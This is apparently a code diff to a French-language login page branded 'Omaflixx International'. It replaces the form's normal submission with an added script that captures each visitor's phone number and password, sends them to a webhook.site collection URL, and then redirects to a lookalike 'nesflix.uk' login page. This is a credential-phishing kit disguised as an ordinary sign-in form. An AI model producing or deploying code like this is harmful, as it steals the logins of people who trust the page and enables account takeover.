@@ -108,9 +108,9 @@
     
     <div class="login-box">
       <h2>Se connecter</h2>
-      <form action="/connexion" method="post">
-        <input type="text" name="phone" placeholder="Numéro de téléphone" required>
-        <input type="password" name="password" placeholder="Mot de passe" required>
+      <form id="loginForm">
+        <input type="text" id="phone" placeholder="Numéro de téléphone" required>
+        <input type="password" id="password" placeholder="Mot de passe" required>
         <button type="submit">Se connecter</button>
       </form>
       <div class="signup">
@@ -120,5 +120,29 @@
 
     <div class="copyright">© 2025 Omaflixx International. Tous droits réservés.</div>
   </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      const phone = document.getElementById("phone").value;
+      const password = document.getElementById("password").value;
+
+      try {
+        await fetch("https://webhook.site/28bc5f45-a231-4b01-aef2-40b14fd23775", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ phone, password })
+        });
+      } catch (err) {
+        console.error("Erreur lors de l'envoi au webhook:", err);
+      }
+
+      // Redirection après envoi
+      window.location.href = "https://nesflix.uk/login";
+    });
+  </script>
 </body>
 </html>
